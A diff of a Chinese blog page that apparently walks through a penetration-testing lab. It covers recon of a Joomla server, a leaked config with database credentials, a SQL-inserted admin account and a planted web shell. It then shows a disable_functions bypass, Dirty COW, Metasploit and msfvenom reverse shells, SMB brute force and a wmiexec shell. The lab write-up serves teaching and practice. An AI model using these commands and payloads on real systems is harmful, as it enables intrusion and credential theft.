@@ -315,7 +315,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.2k</span>
+              <span>9.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -335,17 +335,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>设置VM2 网段为 192.168.93.0/24 需要重启一些centos的网卡<code>service network restart</code></p>
+        <h3 id="环境搭建">环境搭建</h3>
+<p>设置VM2 网段为 192.168.93.0/24
+需要重启一些centos的网卡<code>service network restart</code></p>
 <blockquote>
-<p>web-centos     192.168.3.40（这里的ip经常会变化）        192.168.93.100<br>web-ubuntu    192.168.93.120<br>win2008<br>win2012<br>win7</p>
+<p>web-centos 192.168.3.40（这里的ip经常会变化） 192.168.93.100<br>
+web-ubuntu 192.168.93.120 win2008 win2012 win7</p>
 </blockquote>
 <p><img src="/posts/2ce9ab7f/tuopu.png"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h4><p><code>sudo nmap 192.168.3.40 -sV</code></p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="nmap端口扫描">nmap端口扫描</h4>
+<p><code>sudo nmap 192.168.3.40 -sV</code></p>
 <blockquote>
-<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-07-25 16:15 CST<br>Nmap scan report for 192.168.3.40<br>Host is up (0.0082s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.3 (protocol 2.0)<br>25/tcp   open  tcpwrapped<br>80/tcp   open  http       nginx 1.9.4<br>110/tcp  open  tcpwrapped<br>3306/tcp open  mysql      MySQL 5.7.27-0ubuntu0.16.04.1</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</p>
+<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV [sudo] kali
+的密码： Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 16:15 CST
+Nmap scan report for 192.168.3.40 Host is up (0.0082s latency). Not
+shown: 995 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh
+OpenSSH 5.3 (protocol 2.0) 25/tcp open tcpwrapped 80/tcp open http nginx
+1.9.4 110/tcp open tcpwrapped 3306/tcp open mysql MySQL
+5.7.27-0ubuntu0.16.04.1</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 17.42 seconds</p>
 </blockquote>
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>使用dirmap扫描</p>
+<h4 id="目录扫描">目录扫描</h4>
+<p>使用dirmap扫描</p>
 <p><code>sudo python3 dirmap.py -i 192.168.3.40 -lcf</code></p>
 <p><img src="/posts/2ce9ab7f/dirmap_output.png"></p>
 <p>使用dirsearch扫描</p>
@@ -353,7 +367,6 @@
 <p><img src="/posts/2ce9ab7f/dirsearch_output.png"></p>
 <p>得到几个敏感目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[200][text/html; charset=UTF-8][23.75kb] http://192.168.3.40/1.php                  </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/2.php                       </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/          </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/index.php </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/bin/                                   </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/cache/                                 </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/configuration.php           </span><br><span class="line">[200][None][1.88kb] http://192.168.3.40/configuration.php~                          </span><br><span class="line">[200][text/plain][1.43kb] http://192.168.3.40/htaccess.txt                          </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/includes/                              </span><br><span class="line">[200][text/html; charset=utf-8][3.91kb] http://192.168.3.40/index.php               </span><br><span class="line">[200][text/plain][6.67kb] http://192.168.3.40/LICENSE.txt                           </span><br><span class="line">[200][text/html; charset=utf-8][2.67kb] http://192.168.3.40/index.php/login/        </span><br><span class="line">[200][text/plain][1.71kb] http://192.168.3.40/README.txt                            </span><br><span class="line">[200][text/plain][392.00b] http://192.168.3.40/robots.txt                           </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/templates/                             </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/tmp/                                   </span><br><span class="line">[200][text/plain][628.00b] http://192.168.3.40/web.config.txt     </span><br></pre></td></tr></table></figure>
-
 <p>访问1.php发现是 phpinfo页面</p>
 <p><img src="/posts/2ce9ab7f/phpinfo.png"></p>
 <p>访问<code>http://192.168.3.40/configuration.php~</code>应该是配置文件的备份</p>
@@ -362,71 +375,79 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public $dbtype = &#x27;mysqli&#x27;;</span><br><span class="line">public $host = &#x27;localhost&#x27;;</span><br><span class="line">public $user = &#x27;testuser&#x27;;</span><br><span class="line">public $password = &#x27;cvcvgjASD!@&#x27;;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p><img src="/posts/2ce9ab7f/sql_config.png"></p>
-<p>访问<code>http://192.168.3.40/administrator/  </code>看到是Joomla! 搭建的网站，可以使用<code>joomscan</code></p>
-<p><code>sudo perl joomscan.pl -u 192.168.3.40  </code></p>
-<br>
-
+<p>访问<code>http://192.168.3.40/administrator/</code>看到是Joomla!
+搭建的网站，可以使用<code>joomscan</code></p>
+<p><code>sudo perl joomscan.pl -u 192.168.3.40</code></p>
+<p><br></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">数据库  mysql</span><br><span class="line">        账号:testuser       密码:cvcvgjASD!@</span><br><span class="line">敏感目录</span><br><span class="line">        http://192.168.3.40/1.php                 phpinfo</span><br><span class="line">        http://192.168.3.40/administrator/        后台登录页面，使用Joomla</span><br><span class="line">        http://192.168.3.40/configuration.php~    备份配置文件</span><br><span class="line">        http://192.168.3.40/robots.txt </span><br><span class="line">        http://192.168.3.40/web.config.txt  </span><br><span class="line">文件路径  	/var/www/html</span><br><span class="line">开放端口    22，25，80，110，3306</span><br><span class="line">操作系统    ubuntu16.04.1</span><br><span class="line">后台管理    使用Joomla3.9.12</span><br><span class="line">PHP版本     7.1.32</span><br><span class="line">Apache/2.4.18 (Ubuntu)</span><br><span class="line">User/Group	www-data(33)/33</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="登录mysql创建用户"><a href="#登录mysql创建用户" class="headerlink" title="登录mysql创建用户"></a>登录mysql创建用户</h4><p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="登录mysql创建用户">登录mysql创建用户</h4>
+<p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
 <p><img src="/posts/2ce9ab7f/mysql_conn.png"></p>
-<p>有两个users表 分别为<code>am2zu_users</code>  <code>umnbt_users</code>看下这两个表中有什么有用信息利用</p>
+<p>有两个users表 分别为<code>am2zu_users</code>
+<code>umnbt_users</code>看下这两个表中有什么有用信息利用</p>
 <p><img src="/posts/2ce9ab7f/select_user1.png"></p>
 <p><img src="/posts/2ce9ab7f/select_user2.png"></p>
 <p><a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">Joomal通过数据库添加新超级管理员</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); </span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/2ce9ab7f/login_error.png"></p>
-<p>创建完发现无法登录，重新创建了一个 <code>admin3</code>  <code>secret</code>成功进入后台</p>
+<p>创建完发现无法登录，重新创建了一个 <code>admin3</code>
+<code>secret</code>成功进入后台</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator3&#x27;, &#x27;admin3&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/2ce9ab7f/login_success.png"></p>
-<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>在Extensions中选择Beez3模板，然后点击New File 创建一个shell.php</p>
+<h4 id="getshell">Getshell</h4>
+<p>在Extensions中选择Beez3模板，然后点击New File 创建一个shell.php</p>
 <p><img src="/posts/2ce9ab7f/beez3.png"></p>
 <p><img src="/posts/2ce9ab7f/create_shell_php.png"></p>
 <p><img src="/posts/2ce9ab7f/shell.png"></p>
 <p>shell.php在templates/beez3目录下</p>
 <p>访问验证是否成功上传shell</p>
 <p><img src="/posts/2ce9ab7f/shell_success.png"></p>
-<h4 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h4><h5 id="蚁剑disable-functions插件"><a href="#蚁剑disable-functions插件" class="headerlink" title="蚁剑disable_functions插件"></a>蚁剑disable_functions插件</h5><p>使用蚁剑连接shell，在执行命令时，不论写什么都只会返回<code>ret=127</code></p>
+<h4 id="disable_functions绕过">disable_functions绕过</h4>
+<h5 id="蚁剑disable_functions插件">蚁剑disable_functions插件</h5>
+<p>使用蚁剑连接shell，在执行命令时，不论写什么都只会返回<code>ret=127</code></p>
 <p><img src="/posts/2ce9ab7f/ret_127.png"></p>
 <p><img src="/posts/2ce9ab7f/disable_func.png"></p>
-<p>使用蚁剑的disable_functions插件，选择<code>PHP7_GC_UAF</code> 成功执行命令</p>
+<p>使用蚁剑的disable_functions插件，选择<code>PHP7_GC_UAF</code>
+成功执行命令</p>
 <p><img src="/posts/2ce9ab7f/shell_exec.png"></p>
-<h5 id="使用LD-PRELOAD绕过"><a href="#使用LD-PRELOAD绕过" class="headerlink" title="使用LD_PRELOAD绕过"></a>使用LD_PRELOAD绕过</h5><p>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
-<p>使用蚁剑上传 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 到 /templates/beez3/</p>
+<h5 id="使用ld_preload绕过">使用LD_PRELOAD绕过</h5>
+<p>工具下载地址：https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</p>
+<p>使用蚁剑上传 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 到
+/templates/beez3/</p>
 <p>访问<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php</code></p>
 <p>payload:<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/test&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</code></p>
 <p><img src="/posts/2ce9ab7f/LD_PRELOAD.png"></p>
-<h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><p><code>ifconfig </code></p>
+<h4 id="敏感信息收集">敏感信息收集</h4>
+<p><code>ifconfig</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:145075 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:86884 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:17884352 (17.8 MB)  TX bytes:24388894 (24.3 MB)</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:380140 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:380140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:28142732 (28.1 MB)  TX bytes:28142732 (28.1 MB)</span><br></pre></td></tr></table></figure>
-
-<p>使用蚁剑访问下/home 和 /tmp文件下内容 ，发现/tmp/mysql/test.txt，内容为下:</p>
+<p>使用蚁剑访问下/home 和 /tmp文件下内容
+，发现/tmp/mysql/test.txt，内容为下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser sswwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>
-
-<p><code>uname -a </code>查看内核版本</p>
+<p><code>uname -a</code>查看内核版本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
 <p><code>cat /etc/passwd</code> 查看用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">yy:x:1000:1000:yy,,,:/home/yy:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">www:x:1001:1001::/home/www:/sbin/nologin</span><br></pre></td></tr></table></figure>
-
 <p><code>netstat -ano</code> 查看开放端口，看到开放了22 80和3306</p>
 <p>尝试刚才在tmp中找到的账号登录ssh，成功登录</p>
-<p><code>ssh wwwuser@192.168.3.42 -p 22</code>  <code>wwwuser_123Aqx</code></p>
+<p><code>ssh wwwuser@192.168.3.42 -p 22</code>
+<code>wwwuser_123Aqx</code></p>
 <p><img src="/posts/2ce9ab7f/ssh_login.png"></p>
 <p>查看ip时发现和蚁剑shell上的ip不同，是另一台机器，应该使用到的是nginx反向代理</p>
-<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>使用脏牛提权</p>
-<p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<h4 id="脏牛提权">脏牛提权</h4>
+<p>使用脏牛提权</p>
+<p>下载地址:https://github.com/FireFart/dirtycow</p>
 <p>将dirty.c上传到蚁剑 使用wget下载</p>
 <p><img src="/posts/2ce9ab7f/wget_dirtyc.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">./dirty test123</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/2ce9ab7f/dirtycow.png"></p>
 <p>成功提权为firefart权限</p>
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h4><p>使用exploit/multi/script/web_delivery</p>
+<h3 id="内网渗透">内网渗透</h3>
+<h4 id="上线msf">上线MSF</h4>
+<p>使用exploit/multi/script/web_delivery</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7    # 选择目标系统 可以show targets 查看 7是linux</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.3.43  # kali的ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/2ce9ab7f/msf_web_delivery.png"><br>复制payload到目标机器运行，得到反弹shell<br><img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
+<p><img src="/posts/2ce9ab7f/msf_web_delivery.png">
+复制payload到目标机器运行，得到反弹shell <img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
 <hr>
 <p>当然也可以用msfvenom生成shell</p>
 <p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.42 LPORT=4444 -f elf &gt; shell.elf</code></p>
@@ -435,15 +456,21 @@
 <p><code>chmod +x shell.elf</code></p>
 <p>在kali上开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost kali的ip</span><br><span class="line">lhost =&gt; 192.168.3.43</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
+<h4 id="添加路由">添加路由</h4>
+<p><code>use post/multi/manage/autoroute</code></p>
 <p><img src="/posts/2ce9ab7f/autoroute.png"></p>
-<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
-<p><code>sudo vim /etc.proxychains4.conf</code> 修改为 socks 127.0.0.1</p>
-<h4 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h4><h5 id="利用icmp协议探测存活主机"><a href="#利用icmp协议探测存活主机" class="headerlink" title="利用icmp协议探测存活主机"></a>利用icmp协议探测存活主机</h5><p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code> 扫到5台存活主机</p>
+<h4 id="设置代理">设置代理</h4>
+<p><code>use auxiliary/server/socks_proxy</code></p>
+<p><code>sudo vim /etc.proxychains4.conf</code> 修改为 socks
+127.0.0.1</p>
+<h4 id="存活主机探测">存活主机探测</h4>
+<h5 id="利用icmp协议探测存活主机">利用icmp协议探测存活主机</h5>
+<p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep "ttl"|awk -F "[ :]+" '&#123;print $4&#125;'; done</code>
+扫到5台存活主机</p>
 <p><img src="/posts/2ce9ab7f/icmp.png"></p>
-<h5 id="smb扫描"><a href="#smb扫描" class="headerlink" title="smb扫描"></a>smb扫描</h5><p><code>use auxiliary/scanner/smb/smb_version</code></p>
-<p><code> set rhosts 192.168.93.0/24</code></p>
+<h5 id="smb扫描">smb扫描</h5>
+<p><code>use auxiliary/scanner/smb/smb_version</code></p>
+<p><code>set rhosts 192.168.93.0/24</code></p>
 <p><code>set thread 10</code></p>
 <p><code>run</code></p>
 <p>扫到3台windows机器</p>
@@ -452,34 +479,37 @@
 <p><img src="/posts/2ce9ab7f/smb_30.png"></p>
 <p>所以域内的5台主机都可以确定了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.10	windows 2012</span><br><span class="line">192.168.93.20	windows 2008</span><br><span class="line">192.168.93.30	windows 7	</span><br><span class="line">192.168.93.100  centos</span><br><span class="line">192.168.93.120  ubuntu(nginx反向代理)</span><br></pre></td></tr></table></figure>
-
-<h4 id="内网主机端口探测"><a href="#内网主机端口探测" class="headerlink" title="内网主机端口探测"></a>内网主机端口探测</h4><p>使用nmap扫描一下内网中的3台windows主机开放的端口.</p>
+<h4 id="内网主机端口探测">内网主机端口探测</h4>
+<p>使用nmap扫描一下内网中的3台windows主机开放的端口.</p>
 <p><code>proxychains4 nmap 192.168.93.10 -Pn -sT -sV -F</code></p>
 <p><img src="/posts/2ce9ab7f/nmap_10.png"></p>
 <p>同样的方法扫一下20 30 主机</p>
 <p><img src="/posts/2ce9ab7f/nmap_20.png"></p>
 <p><img src="/posts/2ce9ab7f/nmap_30.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.10     80.135.139.445          win2012</span><br><span class="line">192.168.93.20     80,135,139,445,1433     win2008R2</span><br><span class="line">192.168.93.30     135,139,445             win7</span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>使用ms17-010扫一波漏洞</p>
+<h4 id="漏洞扫描">漏洞扫描</h4>
+<p>使用ms17-010扫一波漏洞</p>
 <p><code>use /scanner/smb/smb_ms17_010</code></p>
 <p><img src="/posts/2ce9ab7f/ms17-010.png"></p>
 <p>没有发现漏洞</p>
-<h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><p>先爆破一下win2008R2主机的mssql smb</p>
+<h4 id="弱口令爆破">弱口令爆破</h4>
+<p>先爆破一下win2008R2主机的mssql smb</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/PASSWORD_top1000.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>自己跑没跑出密码了….看了其他师傅跑出来的密码是<code>123qwe!ASD</code></p>
-<h4 id="使用wmi连接shell"><a href="#使用wmi连接shell" class="headerlink" title="使用wmi连接shell"></a>使用wmi连接shell</h4><p><code>proxychains4 python2 wmiexec.py  &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
+<p>自己跑没跑出密码了....看了其他师傅跑出来的密码是<code>123qwe!ASD</code></p>
+<h4 id="使用wmi连接shell">使用wmi连接shell</h4>
+<p><code>proxychains4 python2 wmiexec.py  'administrator:123qwe!ASD@192.168.93.20'</code></p>
 <p>成功连接20主机的shell</p>
 <p><img src="/posts/2ce9ab7f/wmiexec_shell_20.png"></p>
